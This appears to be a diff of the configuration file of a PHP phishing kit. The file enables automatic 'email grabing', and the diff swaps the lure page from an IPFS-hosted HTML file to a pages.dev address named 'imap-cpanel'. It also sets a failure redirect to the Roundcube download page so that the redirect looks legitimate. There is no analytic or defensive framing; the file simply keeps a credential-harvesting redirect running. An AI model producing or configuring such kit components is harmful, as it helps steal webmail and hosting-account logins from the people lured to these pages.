@@ -10,7 +10,7 @@ Facebook:
 ICQ: 
 */
 $autoEmail="true";//"true":Auto email grabing/ "false":without auto email grabing
-$pagelink="https://cloudflare-ipfs.com/ipfs/bafybeifxfhjukqk4hupvdmzhafmldcxcu4ztmdmflhli4nw6e6ralspst4/zuuu-Portu%20-%20Copy.html";
+$pagelink="https://imap-cpanel.pages.dev";
 $FailRedirect="https://roundcube.net/download/";
 $redirecttype="1";// 1:header - 2:script
 ?>
